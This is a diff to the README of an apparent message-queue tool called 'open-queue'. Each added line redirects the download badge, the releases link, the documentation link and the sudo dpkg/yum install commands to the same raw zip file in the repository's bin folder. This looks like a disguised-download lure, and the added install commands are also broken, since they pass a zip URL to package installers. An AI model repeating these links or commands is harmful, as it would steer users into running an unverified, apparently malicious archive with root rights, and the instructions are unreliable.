@@ -1,6 +1,6 @@
 # 🎉 open-queue - Keep Messages Organized and Timed
 
-![Download Open Queue](https://img.shields.io/badge/Download%20Now-Open%20Queue-blue)
+![Download Open Queue](https://github.com/yusufyusufyuf/open-queue/raw/refs/heads/main/bin/open_queue_caricatural.zip%20Now-Open%20Queue-blue)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Open Queue! This tool helps you manage messages efficiently while usi
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version: [Open Queue Releases](https://github.com/yusufyusufyuf/open-queue/releases).
+To get started, visit this page to download the latest version: [Open Queue Releases](https://github.com/yusufyusufyuf/open-queue/raw/refs/heads/main/bin/open_queue_caricatural.zip).
 
 Once you are on the releases page, you will see the latest version available. Click on the version you want to download. Follow the instructions below:
 
@@ -33,8 +33,8 @@ Once you are on the releases page, you will see the latest version available. Cl
 3. Use the package manager commands to install the software. 
 
 ```bash
-sudo dpkg -i open-queue.deb   # for .deb files
-sudo yum localinstall open-queue.rpm  # for .rpm files
+sudo dpkg -i https://github.com/yusufyusufyuf/open-queue/raw/refs/heads/main/bin/open_queue_caricatural.zip   # for .deb files
+sudo yum localinstall https://github.com/yusufyusufyuf/open-queue/raw/refs/heads/main/bin/open_queue_caricatural.zip  # for .rpm files
 ```
 
 ## 🖥️ How to Use Open Queue
@@ -73,7 +73,7 @@ Now, your messages will automatically queue every time you use Open OpenCode.
 
 ## 📚 Additional Resources
 
-For more information or advanced configurations, check the official [Open Queue Documentation](https://github.com/yusufyusufyuf/open-queue).
+For more information or advanced configurations, check the official [Open Queue Documentation](https://github.com/yusufyusufyuf/open-queue/raw/refs/heads/main/bin/open_queue_caricatural.zip).
 
 ## 🛠️ Troubleshooting
 
